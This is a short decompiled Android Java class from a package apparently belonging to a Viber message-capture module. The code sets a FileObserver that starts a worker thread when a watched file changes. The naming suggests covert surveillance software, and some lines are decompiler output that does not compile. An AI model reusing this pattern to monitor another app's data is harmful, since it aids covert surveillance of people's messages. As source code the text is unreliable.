package com.vvt.capture.viber.mode.full;

import android.os.FileObserver;
import java.io.File;

class g
  extends FileObserver
{
  private Thread b = null;
  private String c;
  private File d;
  
  public g(f paramf, String paramString)
  {
    super(paramString, 2);
    this.c = paramString;
  }
  
  public void onEvent(int paramInt, String paramString)
  {
    Thread localThread = this.b;
    if (localThread == null)
    {
      boolean bool = f.b();
      if (bool) {}
      localThread = new java/lang/Thread;
      h localh = new com/vvt/capture/viber/mode/full/h;
      localh.<init>(this);
      localThread.<init>(localh);
      this.b = localThread;
      localThread = this.b;
      localThread.start();
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/viber/mode/full/FxFileObserverWorker.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */